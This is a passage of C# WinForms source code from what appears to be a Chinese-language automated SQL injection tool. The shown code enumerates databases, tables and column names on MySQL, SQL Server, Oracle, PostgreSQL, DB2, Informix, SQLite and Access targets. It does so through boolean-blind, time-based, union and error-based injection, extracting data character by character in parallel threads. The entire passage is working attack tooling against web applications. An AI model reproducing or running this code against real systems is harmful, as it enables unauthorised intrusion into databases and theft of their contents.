                        stp.QueueWorkItem<SelectNode>(getTableNameValueByErrorByPostgreSQL, sn);
                    }
                    stp.WaitForIdle();
                    break;
                case DBType.DB2:
                    MessageBox.Show("抱歉DB2数据库暂不支持显错方式获取数据！");
                    break;
            }
        }

        /// <summary>
        /// 获取数据库列表
        /// </summary>
        public void getDBS()
        {
            this.currentDbsCount = 0;
            switch (config.injectType)
            {
                case InjectType.Blind:
                    getDBSByBool(config.dbType);
                    break;

                case InjectType.Union:
                    getDBSByUnion(config.dbType);
                    break;
                case InjectType.Error:
                    getDBSByError(config.dbType);
                    break;

            }

        }
        private void data_dbs_tsl_getDBS_Click(object sender, EventArgs e)
        {
            if (stp.InUseThreads == 0)
            {
                //获取环境变量
                this.data_tvw_dbs.Nodes.Clear();
                //没有库的数据库
                if (DBType.Access.Equals(config.dbType))
                {
                    addDBToTreeList(DBType.Access.ToString());
                }
                else if (DBType.SQLite.Equals(config.dbType))
                {
                    addDBToTreeList(DBType.SQLite.ToString());
                }
                //检查注入配置
                if (checkConfig())
                {
                    //判断是否标记注入点
                    if (isSetInjectPoint())
                    {
                        status = 1;
                        this.currentThread = new Thread(getDBS);
                        this.currentThread.Start();
                    }
                }
            }
            else
            {
                MessageBox.Show("还有线程未结束，请稍后....");
            }
        }

        /// <summary>
        /// 获取当前数据库下的表
        /// </summary>
        /// <param name="otn">当前数据库的TreeNode节点</param>
        public void getTables(Object otn)
        {
            if (checkConfig())
            {
                if (isSetInjectPoint())
                {
                    this.currentTableCount = 0;
                    switch (config.injectType)
                    {
                        case InjectType.Blind:
                            getTableNameByBool(config.dbType, (TreeNode)otn);
                            break;
                        case InjectType.Union:
                            getTableNameByUnion(config.dbType, (TreeNode)otn);
                            break;
                        case InjectType.Error:
                            getTableNameByError(config.dbType, (TreeNode)otn);
                            break;
                    }

                }
                else
                {
                    MessageBox.Show("请标记注入点！");
                }
            }
            else
            {
                MessageBox.Show("配置不完整，请检注入查配置！");
            }
        }

        private void data_dbs_tsl_getTables_Click(object sender, EventArgs e)
        {
            foreach (TreeNode tn in this.data_tvw_dbs.Nodes)
            {
                if (tn.Checked && "dbs".Equals(tn.Tag))
                {
                    if (stp.InUseThreads == 0)
                    {
                        tn.Nodes.Clear();
                        status = 1;
                        this.currentThread = new Thread(new ParameterizedThreadStart(getTables));
                        this.currentThread.Start(tn);
                    }
                    else
                    {
                        MessageBox.Show("还有线程未结束，请稍后....");
                    }
                }
            }
        }

        /// <summary>
        /// 获取列明称,bool方式
        /// </summary>
        /// <param name="osn">表的节点</param>
        public void getColumnNameByBoolByMySQL(Object osn)
        {

            try
            {
                SelectNode sn = (SelectNode)osn;
                //判断当前表长度
                String data_payload = MySQL.column_value.Replace("'{table}'", Tools.strToHex(sn.tableName, "UTF-8")).Replace("{index}", sn.limit + "").Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8"));
                int len = 0;
                if (KeyType.Time.Equals(config.keyType))
                {
                    len = getValue(MySQL.getBoolDataBySleep(MySQL.bool_length.Replace("{data}", data_payload), config.maxTime), 1, 50);
                }
                else
                {

                    len = getValue(MySQL.ver_length.Replace("{data}", data_payload), 1, 50);
                }

                //判断当前数据库对应的ascii码
                String va_payload = MySQL.ver_value.Replace("{data}", data_payload);
                if (KeyType.Time.Equals(config.keyType))
                {
                    va_payload = MySQL.getBoolDataBySleep(MySQL.bool_value.Replace("{data}", data_payload), config.maxTime);
                }
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 0, 128);
                    value += ((char)ascii).ToString();
                    this.data_tvw_dbs.Invoke(new setNodeToTreeListDelegate(setNodeToTreeList), sn.tn, sn.limit, value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), "表" + sn.tableName + "发现列：" + value, LogLevel.info);

            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
            }
        }

        /// <summary>
        /// PostgreSQL获取列明称,bool方式
        /// </summary>
        /// <param name="osn">表的节点</param>
        public void getColumnNameByBoolByPostgreSQL(Object osn)
        {

            try
            {
                SelectNode sn = (SelectNode)osn;
                //判断当前表长度
                String data_payload = PostgreSQL.column_value.Replace("'{table}'", Tools.strToChr(sn.tableName, "UTF-8")).Replace("{index}", sn.limit + "").Replace("'{dbname}'", Tools.strToChr(sn.dbname, "UTF-8"));
                int len = 0;
                if (KeyType.Time.Equals(config.keyType))
                {
                    len = getValue(PostgreSQL.getBoolDataBySleep(PostgreSQL.bool_length.Replace("{data}", data_payload), config.maxTime), 1, 50);
                }
                else
                {

                    len = getValue(PostgreSQL.ver_length.Replace("{data}", data_payload), 1, 50);
                }

                //判断当前数据库对应的ascii码
                String va_payload = PostgreSQL.ver_value.Replace("{data}", data_payload);
                if (KeyType.Time.Equals(config.keyType))
                {
                    va_payload = PostgreSQL.getBoolDataBySleep(PostgreSQL.bool_value.Replace("{data}", data_payload), config.maxTime);
                }
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 0, 128);
                    value += ((char)ascii).ToString();
                    this.data_tvw_dbs.Invoke(new setNodeToTreeListDelegate(setNodeToTreeList), sn.tn, sn.limit, value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), "表" + sn.tableName + "发现列：" + value, LogLevel.info);

            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
            }
        }

        /// <summary>
        /// 获取列名称,bool方式
        /// </summary>
        /// <param name="osn">表的节点</param>
        public void getColumnNameByBoolBySQLServer(Object osn)
        {

            try
            {
                SelectNode sn = (SelectNode)osn;
                String data_payload = SQLServer.column_value.Replace("{index}", sn.limit.ToString()).Replace("'{dbname}..{table}'", Tools.strToChar(sn.dbname + ".." + sn.tableName, "UTF-8")).Replace("{dbname}", sn.dbname);
                int len = getValueByStepUp(SQLServer.bool_length.Replace("{data}", data_payload), 0, 10);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //取值payload，替换对应下标值
                    //select UNICODE(substring(@@version,{index},1))
                    //取值payload，替换对应下标值
                    String unicode_data_payload = SQLServer.nocast_unicode_value.Replace("{index}", i + "").Replace("{data}", data_payload);

                    //根据unicode值得长度确定范围在判断，提高效率
                    for (int j = 3; j <= 7; j++)
                    {
                        Boolean isLarge = checkLen(SQLServer.check_li_value.Replace("{data}", unicode_data_payload), j);
                        if (isLarge)
                        {
                            int end = (int)Math.Pow(10, j - 1) - 1;
                            int unicode = getValue(SQLServer.bool_value.Replace("{data}", unicode_data_payload), 0, end);
                            value += Tools.unHexByUnicode(unicode, config.db_encoding);
                            break;
                        }
                    }
                    this.data_tvw_dbs.Invoke(new setNodeToTreeListDelegate(setNodeToTreeList), sn.tn, sn.limit, value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), "表" + sn.tableName + "发现列：" + value, LogLevel.info);


            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
            }
        }

        /// <summary>
        /// 获取列名称,bool方式
        /// </summary>
        /// <param name="osn">表的节点</param>
        public void getColumnNameByBoolBySQLServerSleep(Object osn)
        {

            try
            {
                SelectNode sn = (SelectNode)osn;
                String data_payload = SQLServer.column_value.Replace("{index}", sn.limit.ToString()).Replace("'{dbname}..{table}'", Tools.strToChar(sn.dbname + ".." + sn.tableName, "UTF-8")).Replace("{dbname}", sn.dbname);
                int len = getValueByStepUp(SQLServer.getBoolDataBySleep(SQLServer.bool_length.Replace("{data}", data_payload), config.maxTime), 0, 10);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //取值payload，替换对应下标值
                    //select UNICODE(substring(@@version,{index},1))
                    //取值payload，替换对应下标值
                    String unicode_data_payload = SQLServer.unicode_value.Replace("{index}", i + "").Replace("{data}", data_payload);
                    //取unicode转换后的长度
                    String unicode_data_len_payload = SQLServer.bool_length.Replace("{data}", unicode_data_payload);

                    //长度范围2-8支持大部分语言
                    int unicode_data_len = getValue(SQLServer.getBoolDataBySleep(unicode_data_len_payload, config.maxTime), 1, 8);
                    int m_index = 1;
                    StringBuilder unicodes = new StringBuilder();
                    while (m_index <= unicode_data_len)
                    {
                        //获取多字节
                        String substr_payload = SQLServer.substr.Replace("{data}", unicode_data_payload).Replace("{index}", m_index.ToString());
                        //单个unicode值范围是0-9
                        int unicode = getValue(SQLServer.getBoolDataBySleep(SQLServer.bool_value.Replace("{data}", substr_payload), config.maxTime), 0, 9);
                        unicodes.Append(unicode.ToString());
                        m_index++;
                    }

                    if (Tools.convertToInt(unicodes.ToString()) > 255)
                    {
                        value += Tools.unHexByUnicode(int.Parse(unicodes.ToString()), config.db_encoding);
                    }
                    else
                    {
                        value += (char)Tools.convertToInt(unicodes.ToString());
                    }
                    this.data_tvw_dbs.Invoke(new setNodeToTreeListDelegate(setNodeToTreeList), sn.tn, sn.limit, value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), "表" + sn.tableName + "发现列：" + value, LogLevel.info);

            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
            }
        }


        /// <summary>
        /// 获取列明称,bool方式
        /// </summary>
        /// <param name="osn">表的节点</param>
        public void getColumnNameByBoolByOracle(Object osn)
        {

            try
            {
                SelectNode sn = (SelectNode)osn;
                //判断当前表长度
                String data_payload = Oracle.column_value.Replace("{table}", sn.tableName).Replace("{index}", sn.limit + "").Replace("{dbname}", sn.dbname);
                int len = getValue(Oracle.bool_length.Replace("{data}", data_payload), 1, 50);

                //判断当前数据库对应的ascii码
                String va_payload = Oracle.bool_value.Replace("{data}", data_payload);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 0, 128);
                    value += ((char)ascii).ToString();
                    this.data_tvw_dbs.Invoke(new setNodeToTreeListDelegate(setNodeToTreeList), sn.tn, sn.limit - 1, value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), "表" + sn.tableName + "发现列：" + value, LogLevel.info);

            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
            }
        }

        /// <summary>
        /// 获取列明称,bool方式
        /// </summary>
        /// <param name="osn">表的节点</param>
        public void getColumnNameByBoolByDB2(Object osn)
        {

            try
            {
                SelectNode sn = (SelectNode)osn;
                //判断当前表长度
                String data_payload = DB2.column_value.Replace("{table}", sn.tableName).Replace("{index}", sn.limit + "").Replace("{dbname}", sn.dbname);
                int len = getValue(DB2.bool_length.Replace("{data}", data_payload), 1, 50);

                //判断当前数据库对应的ascii码
                String va_payload = DB2.bool_value.Replace("{data}", data_payload);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 0, 128);
                    value += ((char)ascii).ToString();
                    this.data_tvw_dbs.Invoke(new setNodeToTreeListDelegate(setNodeToTreeList), sn.tn, sn.limit - 1, value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), "表" + sn.tableName + "发现列：" + value, LogLevel.info);

            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
            }
        }

        /// <summary>
        /// 获取列明称,bool方式
        /// </summary>
        /// <param name="osn">表的节点</param>
        public void getColumnNameByBoolByInformix(Object osn)
        {

            try
            {
                SelectNode sn = (SelectNode)osn;
                //判断当前表长度
                String data_payload = Informix.column_value.Replace("{table}", sn.tableName).Replace("{index}", sn.limit + "").Replace("{dbname}", sn.dbname);
                //判断当前数据库对应的ascii码
                String va_payload = Informix.bool_value.Replace("{data}", data_payload);

                int len = 0;
                if (KeyType.Time.Equals(config.keyType))
                {
                    va_payload = Informix.getBoolDataBySleep(Informix.bool_value.Replace("{data}", data_payload));
                    len = getValue(Informix.getBoolDataBySleep(Informix.bool_length.Replace("{data}", data_payload)), 1, 50);
                }
                else
                {
                    len = getValue(Informix.bool_length.Replace("{data}", data_payload), 1, 50);
                }

                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 0, 128);
                    value += ((char)ascii).ToString();
                    this.data_tvw_dbs.Invoke(new setNodeToTreeListDelegate(setNodeToTreeList), sn.tn, sn.limit, value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), "表" + sn.tableName + "发现列：" + value, LogLevel.info);

            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
            }
        }

        /// <summary>
        /// 获取列明称,bool方式
        /// </summary>
        /// <param name="osn">表的节点</param>
        public void getColumnNameByBoolBySQLite(Object osn)
        {

            try
            {
                SelectNode sn = (SelectNode)osn;
                //判断当前长度
                String data_payload = SQLite.column_value.Replace("'{table}'", Tools.strToChar(sn.tableName, "UTF-8", "||")).Replace("{index}", sn.limit + "").Replace("{dbname}", sn.dbname);
                int len = getValueByStepUp(SQLite.bool_length.Replace("{data}", data_payload), 1, 50);

                //判断当前数据库对应的ascii码
                String va_payload = SQLite.bool_value.Replace("{data}", data_payload);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 0, 128);
                    value += ((char)ascii).ToString();
                }
                List<String> columns = Tools.GetSQLiteColumns(value);
                this.txt_log.Invoke(new showLogDelegate(log), "表" + sn.tableName + "发现列：" + String.Join(",", columns), LogLevel.info);
                foreach (String column in columns)
                {
                    this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, column, "column");
                }

            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
            }
        }

        /// <summary>
        /// 获取列名，union MySQL
        /// </summary>
        /// <param name="osn"></param>
        public void getColumnNameByUnionByMySQL(Object osn)
        {
            try
            {
                SelectNode sn = (SelectNode)osn;
                //获取数据库数量
                List<String> data_list = new List<String>();
                data_list.Add(MySQL.column_value.Replace("{index}", sn.limit.ToString()).Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8")).Replace("'{table}'", Tools.strToHex(sn.tableName, "UTF-8")));
                String column_Name_data = MySQL.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, data_list, null, null, -1);
                String result = getOneDataByUnionOrError(MySQL.union_value.Replace("{data}", column_Name_data));
                this.txt_log.Invoke(new showLogDelegate(log), "发现列：" + result, LogLevel.info);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
            }
        }

        /// <summary>
        /// 获取列名，union SQLServer
        /// </summary>
        /// <param name="osn"></param>
        public void getColumnNameByUnionBySQLServer(Object osn)
        {
            try
            {
                SelectNode sn = (SelectNode)osn;

                String column_Name_data = SQLServer.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, SQLServer.column_value.Replace("'{dbname}..{table}'", Tools.strToChar(sn.dbname + ".." + sn.tableName, "UTF-8")), sn.dbname, sn.tableName, sn.limit.ToString());
                String result = getOneDataByUnionOrError(column_Name_data);
                this.txt_log.Invoke(new showLogDelegate(log), "发现列：" + result, LogLevel.info);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
            }
        }

        /// <summary>
        /// 获取列名，union SQLServer
        /// </summary>
        /// <param name="osn"></param>
        public void getColumnNameByUnionBySQLite(Object osn)
        {
            try
            {
                SelectNode sn = (SelectNode)osn;

                String column_Name_data = SQLite.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, SQLite.column_value.Replace("'{table}'", Tools.strToChar(sn.tableName, "UTF-8", "||")));
                String result = getOneDataByUnionOrError(column_Name_data);
                //SQLite获取的列需要进行处理
                List<String> columns = Tools.GetSQLiteColumns(result);
                this.txt_log.Invoke(new showLogDelegate(log), "发现列：" + String.Join(",", columns), LogLevel.info);
                foreach (String column in columns)
                {

                    this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, column, "column");
                }
            }
            catch (Exception e)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
            }
        }


        /// <summary>
        /// 获取列名，union oracle
        /// </summary>
        /// <param name="osn"></param>
        public void getColumnNameByUnionByOracle(Object osn)
        {
            try
            {
                SelectNode sn = (SelectNode)osn;

                String column_Name_data = Oracle.getUnionDataValue(config.columnsCount, config.showColumn, Oracle.column_value, sn.dbname, sn.tableName, sn.limit.ToString());
                String result = getOneDataByUnionOrError(column_Name_data);
                this.txt_log.Invoke(new showLogDelegate(log), "发现列：" + result, LogLevel.info);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
            }
        }

        /// <summary>
        /// 获取列名，union DB2
        /// </summary>
        /// <param name="osn"></param>
        public void getColumnNameByUnionByDB2(Object osn)
        {
            try
            {
                SelectNode sn = (SelectNode)osn;

                String column_Name_data = DB2.getUnionDataValue(config.unionFillTemplate, DB2.column_value, sn.dbname, sn.tableName, sn.limit.ToString());
                String result = getOneDataByUnionOrError(column_Name_data);
                this.txt_log.Invoke(new showLogDelegate(log), "发现列：" + result, LogLevel.info);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
            }
        }

        /// <summary>
        /// 获取列名，union DB2
        /// </summary>
        /// <param name="osn"></param>
        public void getColumnNameByUnionByInformix(Object osn)
        {
            try
            {
                SelectNode sn = (SelectNode)osn;

                String column_Name_data = Informix.getUnionDataValue(config.unionFillTemplate, Informix.column_value, sn.dbname, sn.tableName, sn.limit.ToString(), Informix.cast_value);
                String result = getOneDataByUnionOrErrorByInformix(column_Name_data);
                this.txt_log.Invoke(new showLogDelegate(log), "发现列：" + result, LogLevel.info);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
            }
        }

        /// <summary>
        /// 获取列名，union PostgreSQL
        /// </summary>
        /// <param name="osn"></param>
        public void getColumnNameByUnionByPostgreSQL(Object osn)
        {
            try
            {
                SelectNode sn = (SelectNode)osn;

                String column_Name_data = PostgreSQL.getUnionDataValue(config.columnsCount, config.showColumn, PostgreSQL.column_value.Replace("{index}", sn.limit.ToString()).Replace("'{dbname}'", Tools.strToChr(sn.dbname, "UTF-8")).Replace("'{table}'", Tools.strToChr(sn.tableName, "UTF-8")), sn.dbname, sn.tableName, sn.limit.ToString());
                String result = getOneDataByUnionOrError(column_Name_data);
                this.txt_log.Invoke(new showLogDelegate(log), "发现列：" + result, LogLevel.info);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
            }
        }


        public void getColumnNameByErrorByMySQL(Object osn)
        {
            try
            {
                SelectNode sn = (SelectNode)osn;
                //获取数据库数量
                List<String> data_list = new List<String>();
                data_list.Add(MySQL.column_value.Replace("{index}", sn.limit.ToString()).Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8")).Replace("'{table}'", Tools.strToHex(sn.tableName, "UTF-8")));
                String column_Name_data = MySQL.creatMySQLColumnsStrByError(data_list, null, null, -1);
                String result = getOneDataByUnionOrError(MySQL.error_value.Replace("{data}", column_Name_data));
                this.txt_log.Invoke(new showLogDelegate(log), "发现列：" + result, LogLevel.info);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
            }
        }

        public void getColumnNameByErrorBySQLServer(Object osn)
        {
            try
            {
                SelectNode sn = (SelectNode)osn;
                String result = getOneDataByUnionOrError(SQLServer.error_value.Replace("{data}", SQLServer.column_value.Replace("{index}", sn.limit.ToString()).Replace("'{dbname}..{table}'", Tools.strToChar(sn.dbname + ".." + sn.tableName, "UTF-8"))).Replace("{dbname}", sn.dbname));
                this.txt_log.Invoke(new showLogDelegate(log), "发现列：" + result, LogLevel.info);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
            }
        }

        public void getColumnNameByErrorByPostgreSQL(Object osn)
        {
            try
            {
                SelectNode sn = (SelectNode)osn;
                String result = getOneDataByUnionOrError(PostgreSQL.error_value.Replace("{data}", PostgreSQL.column_value.Replace("{index}", sn.limit.ToString()).Replace("'{dbname}'", Tools.strToChr(sn.dbname, "UTF-8")).Replace("'{table}'", Tools.strToChr(sn.tableName, "UTF-8"))));
                this.txt_log.Invoke(new showLogDelegate(log), "发现列：" + result, LogLevel.info);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
            }
        }

        public void getColumnNameByErrorByOracle(Object osn)
        {
            try
            {
                SelectNode sn = (SelectNode)osn;
                String result = getOneHexDataByUnionOrError(Oracle.getErrorDataValue(Oracle.column_value, sn.dbname, sn.tableName, sn.limit.ToString()));
                this.txt_log.Invoke(new showLogDelegate(log), "发现列：" + result, LogLevel.info);
                this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取列名时发生异常：" + e.Message, LogLevel.error);
            }
        }

        /// <summary>
        /// 获取表下面的列
        /// </summary>
        /// <param name="dbType">数据库类型</param>
        public void getColumnsByBool(DBType dbType)
        {

            foreach (TreeNode tn in this.data_tvw_dbs.Nodes)
            {
                foreach (TreeNode ctn in tn.Nodes)
                {
                    if (ctn.Checked && "table".Equals(ctn.Tag))
                    {
                        ctn.Nodes.Clear();

                        String dbName = ctn.Parent.Text;
                        String tableName = ctn.Text;
                        int columns_count = 0;
                        switch (dbType)
                        {

                            case DBType.Access:
                                checkColumnsDic(ctn);
                                break;
                            case DBType.MySQL:

                                if (KeyType.Time.Equals(config.keyType))
                                {
                                    columns_count = getValueByStepUp(MySQL.getBoolDataBySleep(MySQL.columns_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")).Replace("'{table}'", Tools.strToHex(tableName, "UTF-8")), config.maxTime), 0, 20);
                                }
                                else
                                {
                                    columns_count = getValueByStepUp(MySQL.bool_columns_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")).Replace("'{table}'", Tools.strToHex(tableName, "UTF-8")), 0, 20);
                                }

                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "发现" + columns_count + "个列！", LogLevel.info);
                                for (int i = 0; i < columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    this.data_tvw_dbs.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), ctn, "", "column");
                                    stp.QueueWorkItem<SelectNode>(getColumnNameByBoolByMySQL, sn);
                                }
                                stp.WaitForIdle();
                                break;
                            case DBType.SQLServer:
                                if (KeyType.Time.Equals(config.keyType))
                                {
                                    columns_count = getValueByStepUp(SQLServer.getBoolDataBySleep(SQLServer.bool_columns_count.Replace("'{dbname}..{table}'", Tools.strToChar(dbName + ".." + tableName, "UTF-8")).Replace("{dbname}", dbName), config.maxTime), 0, 20);
                                }
                                else
                                {
                                    columns_count = getValueByStepUp(SQLServer.bool_columns_count.Replace("'{dbname}..{table}'", Tools.strToChar(dbName + ".." + tableName, "UTF-8")).Replace("{dbname}", dbName), 0, 20);
                                }

                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "发现" + columns_count + "个列！", LogLevel.info);
                                for (int i = 0; i < columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    this.data_tvw_dbs.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), ctn, "", "column");
                                    if (KeyType.Time.Equals(config.keyType))
                                    {
                                        stp.QueueWorkItem<SelectNode>(getColumnNameByBoolBySQLServerSleep, sn);
                                    }
                                    else
                                    {
                                        stp.QueueWorkItem<SelectNode>(getColumnNameByBoolBySQLServer, sn);
                                    }

                                }
                                stp.WaitForIdle();
                                break;
                            case DBType.Oracle:
                                columns_count = getValueByStepUp(Oracle.bool_columns_count.Replace("{dbname}", dbName).Replace("{table}", tableName), 0, 20);
                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "发现" + columns_count + "个列！", LogLevel.info);
                                for (int i = 1; i <= columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    this.data_tvw_dbs.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), ctn, "", "column");
                                    stp.QueueWorkItem<SelectNode>(getColumnNameByBoolByOracle, sn);
                                }
                                stp.WaitForIdle();
                                break;
                            case DBType.PostgreSQL:

                                if (KeyType.Time.Equals(config.keyType))
                                {
                                    columns_count = getValueByStepUp(PostgreSQL.getBoolDataBySleep(PostgreSQL.columns_count.Replace("'{dbname}'", Tools.strToChr(dbName, "UTF-8")).Replace("'{table}'", Tools.strToChr(tableName, "UTF-8")), config.maxTime), 0, 20);
                                }
                                else
                                {
                                    columns_count = getValueByStepUp(PostgreSQL.bool_columns_count.Replace("'{dbname}'", Tools.strToChr(dbName, "UTF-8")).Replace("'{table}'", Tools.strToChr(tableName, "UTF-8")), 0, 20);
                                }

                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "发现" + columns_count + "个列！", LogLevel.info);
                                for (int i = 0; i < columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    this.data_tvw_dbs.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), ctn, "", "column");
                                    stp.QueueWorkItem<SelectNode>(getColumnNameByBoolByPostgreSQL, sn);
                                }
                                stp.WaitForIdle();
                                break;
                            case DBType.DB2:
                                columns_count = getValueByStepUp(DB2.bool_columns_count.Replace("{dbname}", dbName).Replace("{table}", tableName), 0, 20);
                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "发现" + columns_count + "个列！", LogLevel.info);
                                for (int i = 1; i <= columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    this.data_tvw_dbs.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), ctn, "", "column");
                                    stp.QueueWorkItem<SelectNode>(getColumnNameByBoolByDB2, sn);
                                }
                                stp.WaitForIdle();
                                break;
                            case DBType.SQLite:
                                SelectNode csn = new SelectNode();
                                csn.tn = ctn;
                                csn.tableName = tableName;
                                this.data_tvw_dbs.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), ctn, "", "column");
                                stp.QueueWorkItem<SelectNode>(getColumnNameByBoolBySQLite, csn);
                                stp.WaitForIdle();
                                break;
                            case DBType.Informix:
                                if (KeyType.Time.Equals(config.keyType))
                                {
                                    columns_count = getValueByStepUp(Informix.getBoolDataBySleep(Informix.bool_columns_count.Replace("{dbname}", dbName).Replace("{table}", tableName)), 0, 20);
                                }
                                else
                                {
                                    columns_count = getValueByStepUp(Informix.bool_columns_count.Replace("{dbname}", dbName).Replace("{table}", tableName), 0, 20);
                                }

                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "发现" + columns_count + "个列！", LogLevel.info);
                                for (int i = 0; i < columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    this.data_tvw_dbs.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), ctn, "", "column");
                                    stp.QueueWorkItem<SelectNode>(getColumnNameByBoolByInformix, sn);
                                }
